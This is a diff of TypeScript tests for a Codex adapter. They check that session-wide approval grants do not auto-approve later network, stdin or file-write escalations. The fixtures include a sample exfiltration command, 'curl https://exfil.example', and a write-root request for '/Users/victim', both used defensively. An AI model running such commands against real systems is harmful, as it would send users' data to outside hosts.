@@ -259,6 +259,187 @@ describe('#2909: a Codex permissions reply grants only what the user accepted', 
   });
 });
 
+// The shape `codex app-server generate-ts` (codex-cli 0.155.1) emits for
+// `CommandExecutionRequestApprovalParams`.
+function command(
+  id: number,
+  itemId: string,
+  text: string,
+  extra: Record<string, unknown> = {},
+) {
+  return {
+    id,
+    method: 'item/commandExecution/requestApproval',
+    params: {
+      kind: 'command',
+      threadId: 'codex-thread',
+      turnId: 'turn-1',
+      itemId,
+      startedAtMs: 1_790_000_000_000,
+      environmentId: null,
+      reason: null,
+      networkApprovalContext: null,
+      command: text,
+      cwd: '/tmp/project',
+      ...extra,
+    },
+  };
+}
+
+const EXFIL = {
+  networkApprovalContext: { host: 'exfil.example', protocol: 'https' },
+  reason: 'Network access requested',
+};
+
+function openedEvents(events: any[]) {
+  return events.filter((event) => event.method === 'request.opened');
+}
+
+/** Grant `first` for the session through the real reply path. */
+async function grantForSession(
+  adapter: CodexAdapter,
+  process: FakeCodexProcess,
+  events: any[],
+  first: { id: number; method: string; params: unknown },
+) {
+  await emit(process, first);
+  const requestId = await openedRequestId(events, 0);
+  await adapter.respondToRequest(THREAD, requestId, 'acceptForSession');
+  expect(repliesTo(process, first.id)).toHaveLength(1);
+}
+
+/** The second request opened a prompt and got no reply on the wire. */
+async function expectPrompted(
+  process: FakeCodexProcess,
+  events: any[],
+  id: number,
+) {
+  const opened = await waitFor(
+    () => openedEvents(events)[1],
+    'second request.opened',
+  );
+  expect(repliesTo(process, id)).toEqual([]);
+  return opened;
+}
+
+describe('#2911 round 2: a tool grant never covers an escalation riding a tool request', () => {
+  test('a managed-network prompt after a shell_exec grant prompts, names the host, and gets no reply', async () => {
+    const { adapter, process, events } = await startedAdapter();
+    await grantForSession(adapter, process, events, command(71, 'cmd-1', 'ls'));
+
+    await emit(
+      process,
+      command(72, 'cmd-2', 'curl https://exfil.example', EXFIL),
+    );
+
+    const opened = await expectPrompted(process, events, 72);
+    expect(opened).toMatchObject({
+      requestType: 'approval',
+      title: 'network access to exfil.example (https)',
+      payload: { networkApprovalContext: EXFIL.networkApprovalContext },
+    });
+    await adapter.stopAll();
+  });
+
+  test('a session answer on a network prompt reaches Codex and does not auto-allow a later plain command', async () => {
+    const { adapter, process, events } = await startedAdapter();
+    await grantForSession(
+      adapter,
+      process,
+      events,
+      command(81, 'cmd-1', 'curl https://exfil.example', EXFIL),
+    );
+    // Codex itself is told to remember the host for the session.
+    expect(repliesTo(process, 81)[0].result).toEqual({
+      decision: 'acceptForSession',
+    });
+
+    await emit(process, command(82, 'cmd-2', 'ls'));
+
+    const opened = await expectPrompted(process, events, 82);
+    expect(opened).toMatchObject({ title: 'ls' });
+    await adapter.stopAll();
+  });
+
+  test('a shell_exec grant does not cover writing to a terminal; a stdin grant covers later stdin writes', async () => {
+    const { adapter, process, events } = await startedAdapter();
+    await grantForSession(adapter, process, events, command(91, 'cmd-1', 'ls'));
+
+    await emit(
+      process,
+      command(92, 'stdin-1', 'python', {
+        kind: 'writeStdin',
+        approvalId: 'stdin-callback-1',
+      }),
+    );
+    const stdin = await expectPrompted(process, events, 92);
+    await adapter.respondToRequest(THREAD, stdin.requestId, 'acceptForSession');
+
+    // The stdin grant covers a later stdin write ...
+    await emit(
+      process,
+      command(93, 'stdin-2', 'python', {
+        kind: 'writeStdin',
+        approvalId: 'stdin-callback-2',
+      }),
+    );
+    expect(
+      (await waitFor(() => repliesTo(process, 93)[0], 'stdin reply')).result,
+    ).toEqual({ decision: 'accept' });
+    expect(openedEvents(events)).toHaveLength(2);
+    await adapter.stopAll();
+  });
+
+  test('a stdin grant does not cover a later command', async () => {
+    const { adapter, process, events } = await startedAdapter();
+    await grantForSession(
+      adapter,
+      process,
+      events,
+      command(111, 'stdin-1', 'python', {
+        kind: 'writeStdin',
+        approvalId: 'stdin-callback-1',
+      }),
+    );
+
+    await emit(process, command(112, 'cmd-1', 'ls'));
+
+    await expectPrompted(process, events, 112);
+    await adapter.stopAll();
+  });
+
+  test('a file change asking for a write root after an apply_patch grant prompts and gets no reply', async () => {
+    const { adapter, process, events } = await startedAdapter();
+    const fileChange = (
+      id: number,
+      itemId: string,
+      grantRoot: string | null,
+    ) => ({
+      id,
+      method: 'item/fileChange/requestApproval',
+      params: {
+        threadId: 'codex-thread',
+        turnId: 'turn-1',
+        itemId,
+        startedAtMs: 1_790_000_000_000,
+        reason: null,
+        grantRoot,
+      },
+    });
+    await grantForSession(
+      adapter,
+      process,
+      events,
+      fileChange(101, 'fc-1', null),
+    );
+
+    await emit(process, fileChange(102, 'fc-2', '/Users/victim'));
+
+    await expectPrompted(process, events, 102);
+    await adapter.stopAll();
+  });
+});
+
 describe('#2911: a session grant never auto-approves a later permissions escalation', () => {
   test('after acceptForSession on network, a broader fileSystem request prompts and gets no reply', async () => {
     const { adapter, process, events } = await startedAdapter();
@@ -295,16 +476,6 @@ describe('#2911: a session grant never auto-approves a later permissions escalat
 
   test('an ordinary tool grant still auto-allows a later different command', async () => {
     const { adapter, process, events } = await startedAdapter();
-    const command = (id: number, itemId: string, text: string) => ({
-      id,
-      method: 'item/commandExecution/requestApproval',
-      params: {
-        threadId: 'codex-thread',
-        turnId: 'turn-1',
-        itemId,
-        command: text,
-      },
-    });
     await emit(process, command(61, 'cmd-1', 'ls'));
     const first = await openedRequestId(events, 0);
     await adapter.respondToRequest(THREAD, first, 'acceptForSession');
